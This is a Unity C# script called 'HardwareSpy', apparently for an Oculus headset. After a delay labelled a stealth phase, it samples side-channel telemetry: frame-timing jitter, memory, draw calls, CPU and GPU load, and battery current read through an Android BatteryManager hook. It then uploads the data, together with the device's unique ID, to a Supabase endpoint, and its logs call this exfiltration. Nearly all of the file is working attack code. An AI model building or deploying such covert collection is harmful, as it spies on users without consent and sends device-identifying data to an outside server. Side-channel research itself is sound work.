using System;
using System.Collections;
using System.Text;
using UnityEngine;
using UnityEngine.Networking;
using Unity.Profiling;
using Unity.XR.Oculus; // Required for the PerfMetrics API

public class HardwareSpy : MonoBehaviour
{
    [Header("Attack Configuration")]
    public float startDelay = 10f;
    public float samplingRate = 0.1f;
    public int captureDuration = 10;

    [Header("Supabase Hardcoded Keys")]
    // PASTE YOUR KEYS HERE OR IN THE UNITY INSPECTOR
    // URL requires the /rest/v1/(table name) extension
    private string supabaseBaseUrl = "";
    private string supabaseKey = "";

    private StringBuilder csvData = new StringBuilder();

    // Unity Profilers (Release-Safe)
    ProfilerRecorder totalUsedMemoryRecorder;
    ProfilerRecorder gcAllocatedInFrameRecorder;
    ProfilerRecorder drawCallsRecorder;

    // Android Native Hooks
    private AndroidJavaObject batteryManager;
    private bool isAndroid;

    // Timing Jitter
    private float lastTime = 0f;

    void Awake()
    {
        DontDestroyOnLoad(this.gameObject);
        InitializeAndroidHooks();

        // Enable the deep CPU/GPU metric tracking
        Stats.PerfMetrics.EnablePerfMetrics(true);
    }

    private void InitializeAndroidHooks()
    {
        isAndroid = Application.platform == RuntimePlatform.Android;
        if (isAndroid)
        {
            try
            {
                using (AndroidJavaClass unityPlayer = new AndroidJavaClass("com.unity3d.player.UnityPlayer"))
                {
                    AndroidJavaObject activity = unityPlayer.GetStatic<AndroidJavaObject>("currentActivity");
                    batteryManager = activity.Call<AndroidJavaObject>("getSystemService", "batterymanager");
                    Debug.Log("HARDWARE SPY: Android BatteryManager hooked successfully.");
                }
            }
            catch (Exception e)
            {
                Debug.LogWarning("HARDWARE SPY: Failed to hook Android BatteryManager: " + e.Message);
            }
        }
    }

    void OnEnable()
    {
        totalUsedMemoryRecorder = ProfilerRecorder.StartNew(ProfilerCategory.Memory, "Total Used Memory");
        gcAllocatedInFrameRecorder = ProfilerRecorder.StartNew(ProfilerCategory.Memory, "GC Allocated In Frame");
        drawCallsRecorder = ProfilerRecorder.StartNew(ProfilerCategory.Render, "Draw Calls Count");
    }

    void OnDisable()
    {
        if (totalUsedMemoryRecorder.Valid) totalUsedMemoryRecorder.Dispose();
        if (gcAllocatedInFrameRecorder.Valid) gcAllocatedInFrameRecorder.Dispose();
        if (drawCallsRecorder.Valid) drawCallsRecorder.Dispose();
    }

    IEnumerator Start()
    {
        // Build the CSV Header including the new CPU/GPU metrics
        csvData.AppendLine("Timestamp,DeltaTimeJitter,TotalUsedMem,GCAllocated,DrawCalls,CpuUtil,GpuUtil,AppCpuTime,BatteryCurrentMicroAmps");

        yield return StartCoroutine(AttackRoutine());
    }

    IEnumerator AttackRoutine()
    {
        Debug.Log($"HARDWARE SPY: Stealth phase. Waiting {startDelay} seconds...");
        yield return new WaitForSeconds(startDelay);

        Debug.Log("HARDWARE SPY: Commencing side-channel telemetry capture...");
        float startTime = Time.time;
        lastTime = Time.realtimeSinceStartup;

        while (Time.time < startTime + captureDuration)
        {
            float currentTime = Time.realtimeSinceStartup;

            // 1. Timing Jitter (Micro-stutters from spatial meshing)
            float frameJitter = currentTime - lastTime;
            lastTime = currentTime;

            // 2. Unity Profiler Metrics (Release Safe)
            long usedMem = totalUsedMemoryRecorder.LastValue;
            long gcAlloc = gcAllocatedInFrameRecorder.LastValue;
            long drawCalls = drawCallsRecorder.LastValue;

            // 3. Oculus PerfMetrics (CPU/GPU Utilization)
            float cpuUtil = Stats.PerfMetrics.CPUUtilizationAverage;
            float gpuUtil = Stats.PerfMetrics.GPUUtilization;
            float appCpuTime = Stats.PerfMetrics.AppCPUTime;

            // 4. Android Power Metrics
            int currentMicroAmps = 0;
            if (isAndroid && batteryManager != null)
            {
                try
                {
                    // BATTERY_PROPERTY_CURRENT_NOW = 2
                    currentMicroAmps = batteryManager.Call<int>("getIntProperty", 2);
                }
                catch { }
            }

            // Append to payload
            csvData.AppendLine($"{currentTime:F4},{frameJitter:F6},{usedMem},{gcAlloc},{drawCalls},{cpuUtil:F4},{gpuUtil:F4},{appCpuTime:F6},{currentMicroAmps}");

            yield return new WaitForSeconds(samplingRate);
        }

        Debug.Log("HARDWARE SPY: Capture complete. Exfiltrating to power_data...");
        yield return StartCoroutine(UploadToSupabase());
    }

    IEnumerator UploadToSupabase()
    {
        if (string.IsNullOrEmpty(supabaseBaseUrl) || string.IsNullOrEmpty(supabaseKey) || supabaseBaseUrl.Contains("YOUR_SUPABASE"))
        {
            Debug.LogError("HARDWARE SPY: Invalid Supabase credentials. Aborting upload.");
            yield break;
        }

        string cleanCsv = csvData.ToString().Replace("\r", "").Replace("\n", "\\n");

        string jsonPayload = "{" +
            "\"device_id\": \"" + SystemInfo.deviceUniqueIdentifier + "\"," +
            "\"csv_dump\": \"" + cleanCsv + "\"" +
        "}";

        using (UnityWebRequest www = new UnityWebRequest(supabaseBaseUrl, "POST"))
        {
            byte[] bodyRaw = Encoding.UTF8.GetBytes(jsonPayload);
            www.uploadHandler = new UploadHandlerRaw(bodyRaw);
            www.downloadHandler = new DownloadHandlerBuffer();

            www.SetRequestHeader("Content-Type", "application/json");
            www.SetRequestHeader("apikey", supabaseKey);
            www.SetRequestHeader("Authorization", "Bearer " + supabaseKey);
            www.SetRequestHeader("Prefer", "return=representation");

            yield return www.SendWebRequest();

            if (www.result == UnityWebRequest.Result.Success)
            {
                Debug.Log("HARDWARE SPY: Side-channel data successfully exfiltrated!");
                csvData.Clear();
            }
            else
            {
                Debug.LogError("HARDWARE SPY: Exfiltration Failed: " + www.error + " | Response: " + www.downloadHandler.text);
            }
        }
    }
}